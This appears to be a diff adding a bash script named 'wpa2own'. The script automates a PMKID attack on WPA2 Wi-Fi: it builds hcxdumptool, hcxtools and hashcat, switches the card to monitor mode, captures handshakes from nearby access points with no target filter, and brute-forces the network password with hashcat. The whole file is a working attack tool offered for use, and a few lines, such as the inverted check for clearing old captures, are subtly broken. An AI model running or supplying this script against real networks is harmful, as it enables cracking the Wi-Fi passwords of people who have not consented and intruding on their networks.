@@ -1,0 +1,110 @@
+#!/bin/bash
+
+# wpa2own 
+#
+#   - built on 20180808 at DEF CON 26 by github/philcryer
+#   - on Kali Linux (Rolling) 4.17.0-kali1-amd64 #1 SMP Debian 4.17.8-1kali1 (2018-07-24) x86_64 GNU/Linux
+#   - using details found the following the hashcat thread: https://hashcat.net/forum/thread-7717.html
+#   - and this hackernews.com post: https://thehackernews.com/2018/08/how-to-hack-wifi-password.html
+
+# requirements
+#   hardware
+#     * linux
+#     * a network card that supports montior mode
+#
+#   system utilities
+#     * git
+#     * curl
+#     * make
+#     * sudo (or run as root :\ )
+#
+#   packages needed to build hcxtools 
+#     * libopenssl and openssl-dev installed
+#     * librt and librt-dev installed (should be installed by default)
+#     * zlib and zlib-dev installed (for gzip compressed cap/pcap/pcapng files)
+#     * libcurl and curl-dev installed (used by whoismac and wlancap2wpasec)
+#     * libpthread and pthread-dev installed (used by hcxhashcattool)
+#       (install in Kali: apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev)
+#       (TODO: package list for other Linux distros. LMK if you figure any out!)
+#
+#   tools that the script will download and build
+#     * hcxdumptool (v4.2.0+)
+#     * hcxtools (v4.2.0+)
+#     * hashcat (v4.2.0+)
+
+# varable(s)
+#my_interface="wlan0"
+
+# usage
+#   - change the network interface variable to yours (TODO automate this?)
+#   - run it
+#     ./wpa2own
+
+# license
+#   - MIT
+
+# misc
+#   - wargames image from https://twitter.com/BiellaColeman/status/1025078579892285440
+
+if [ ! -d "bin" ]; then mkdir bin; fi
+if [ ! -d "out" ]; then mkdir out; fi
+if [ ! -d "src" ]; then mkdir src; fi
+
+if [ ! -f "bin/hcxdumptool" ]; then
+	cd src
+	curl -L https://github.com/ZerBea/hcxdumptool/archive/4.2.1.tar.gz | tar zx 
+	cd hcxdumptool-*
+	make
+	mv hcxdumptool ../../bin/
+	cd ../..
+fi
+
+if [ ! -f "bin/hashcat" ]; then
+	cd src
+	if [ ! -d "hashcat" ]; then
+		git clone https://github.com/hashcat/hashcat.git
+	fi
+	cd hashcat
+	git submodule update --init
+	make
+	mv hashcat ../../bin/
+	cd ../..
+fi
+
+if [ ! -f "bin/hcxpcaptool" ]; then
+	cd src
+	curl -L https://github.com/ZerBea/hcxtools/archive/4.2.1.tar.gz | tar zx 
+	cd hcxtools-*
+	make
+ 	mv hcxpcaptool hcxhashcattool wlanhc2hcx wlanwkp2hcx wlanhcxinfo wlanhcx2cap wlanhcx2essid wlanhcx2ssid wlanhcxmnc wlanhashhcx wlanhcxcat wlanpmk2hcx wlanjohn2hcx wlancow2hcxpmk whoismac wlanhcx2john wlanhcx2psk wlancap2wpasec ../../bin
+	cd ../..
+fi
+
+chmod a+x bin/*
+
+# this will guess a network interface to use, if this fails, you might have to hardcode this like:
+#my_interface="wlan0"
+my_interface=$(./bin/hcxdumptool -I | tail -n1 | cut -d" " -f2)
+
+# turn on monitor mode - again, your networking interface must support monitor mode
+# if it doesn't, this will fail, and everything else will too :(
+sudo ip link set $my_interface down
+sudo iw dev $my_interface set type monitor
+sudo ip link set $my_interface up
+
+# clear existing pcap if found
+if [ ! -f "out/new.pcapng" ]; then rm -f out/new.pcapng; fi
+
+# run hcxdumptool to capture traffic, build a pcap
+echo "** you may need to run this for 10 minute, look for the message [FOUND PMKID] then ctrl-c **"
+cd out
+# TODO create filterlist 
+#sudo ./hcxdumptool -o new.pcapng -i $my_interface --enable_status=1 --filtermode=2 --filterlist=filter.txt
+sudo ../bin/hcxdumptool -o new.pcapng -i $my_interface --enable_status=1
+../bin/hcxpcaptool -E essidlist -I identitylist -U usernamelist -z new.16800 new.pcapng
+
+echo "** using hashcat to try and get the WPA PSK **"
+../bin/hashcat -m 16800 new.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
+
+exit 0
+
